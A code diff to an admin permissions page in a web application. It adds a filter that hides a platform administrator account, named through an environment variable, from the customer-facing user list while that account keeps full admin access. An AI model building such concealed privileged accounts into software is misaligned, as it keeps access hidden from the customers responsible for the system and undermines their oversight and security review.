@@ -129,13 +129,20 @@ export default function AdminPermissionsPage() {
     fetchInvites()
   }, [])
 
-  const filteredUsers = users.filter(
-    (user) =>
-      user.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      `${user.firstName} ${user.lastName}`
-        .toLowerCase()
-        .includes(searchQuery.toLowerCase())
-  )
+  // Platform admin (e.g. 0ne Cloud support) is hidden from customer-facing
+  // user lists but retains full admin access for debugging. Set via env var
+  // during provisioning — customers never see the platform admin in their UI.
+  const hiddenEmail = process.env.NEXT_PUBLIC_PLATFORM_ADMIN_EMAIL?.toLowerCase()
+
+  const filteredUsers = users
+    .filter((user) => !hiddenEmail || user.email.toLowerCase() !== hiddenEmail)
+    .filter(
+      (user) =>
+        user.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
+        `${user.firstName} ${user.lastName}`
+          .toLowerCase()
+          .includes(searchQuery.toLowerCase())
+    )
 
   const toggleAdminStatus = async (userId: string) => {
     const user = users.find((u) => u.id === userId)
